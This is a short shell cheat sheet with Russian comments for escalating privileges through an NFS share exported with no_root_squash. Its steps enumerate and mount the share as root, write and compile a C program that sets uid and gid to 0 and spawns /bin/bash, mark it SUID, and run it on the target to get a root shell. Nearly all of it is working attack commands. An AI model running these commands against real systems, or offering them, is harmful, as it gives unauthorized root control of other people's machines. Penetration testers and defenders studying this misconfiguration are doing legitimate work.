# 1. Обнаружение

showmount -e <TARGET_IP>                    # Найти шары
cat /etc/exports 2>/dev/null | grep -i "no_root_squash"  # Проверить уязвимость
# 2. Подготовка
mkdir /tmp/nfs_mount                        # Создать точку монтирования
mount -t nfs <TARGET_IP>:/<share> /tmp/nfs_mount  # Монтировать уязвимую шару
# 3. Эксплойт (делать как ROOT на СВОЕЙ машине!)
sudo su                                     # Стать рутом

# Вариант 1: SUID-шелл на C
echo 'int main(){setgid(0);setuid(0);system("/bin/bash");}' > /tmp/nfs_mount/exploit.c
gcc /tmp/nfs_mount/exploit.c -o /tmp/nfs_mount/exploit -w
chmod +s /tmp/nfs_mount/exploit

# 4. Запуск на целевой машине:
cd /<share>
./exploit          